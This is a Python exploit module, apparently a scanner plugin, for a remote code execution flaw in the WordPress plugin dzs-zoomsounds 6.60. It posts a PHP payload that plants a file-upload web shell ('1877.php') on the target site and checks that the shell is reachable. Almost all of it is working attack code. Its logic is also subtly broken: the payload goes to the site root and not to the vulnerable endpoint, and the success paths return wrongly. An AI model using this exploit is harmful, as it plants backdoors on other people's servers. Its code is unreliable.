# coding: utf-8
import requests
import datetime

#WordPress Plugin dzs-zoomsounds 6.60 - Remote Code Execution (RCE)
def poc(url,logindict,user_agent,proxy):

    url = url.strip("/")
    session = requests.Session()

    header = {
        'User-Agent': user_agent
    }

    #漏洞位置
    exploit_url=url+'/wp-content/plugins/dzs-zoomsounds/savepng.php?location=1877.php'

    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = session.get(exploit_url, headers=header, proxies=proxies)
    else:
        response = session.get(exploit_url, headers=header)

    if "error:http raw post data does not exist" in response.text:
        burp0_headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36",
            "Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Connection": "close"}
        burp0_data = "<?php\r\nerror_reporting(0);\r\necho(base64_decode(\"T3ZlcnRoaW5rZXIxODc3Ijxmb3JtIG1ldGhvZD0nUE9TVCcgZW5jdHlwZT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YSc+PGlucHV0IHR5cGU9J2ZpbGUnbmFtZT0nZicgLz48aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0ndXAnIC8+PC9mb3JtPiI=\"));\r\n@copy($_FILES['f']['tmp_name'],$_FILES['f']['name']);\r\necho(\"<a href=\".$_FILES['f']['name'].\">\".$_FILES['f']['name'].\"</a>\");\r\n?>"
        requests.post(url, headers=burp0_headers, data=burp0_data, timeout=45)
        urlx = (url + "/wp-content/plugins/dzs-zoomsounds/1877.php")
        req_second = session.get(urlx, headers=header)
        if "Overthinker1877" in req_second.text:
            return

    if response.status_code==200 and "afterAllImportAJAX" in response.text:
        return "Wordpress Plugin dzs-zoomsounds 6.60 - 远程代码执行漏洞   Exploited ："+urlx


def run(url,logindict,user_agent,proxies):
    result = poc(url,logindict,user_agent,proxies)
    return result


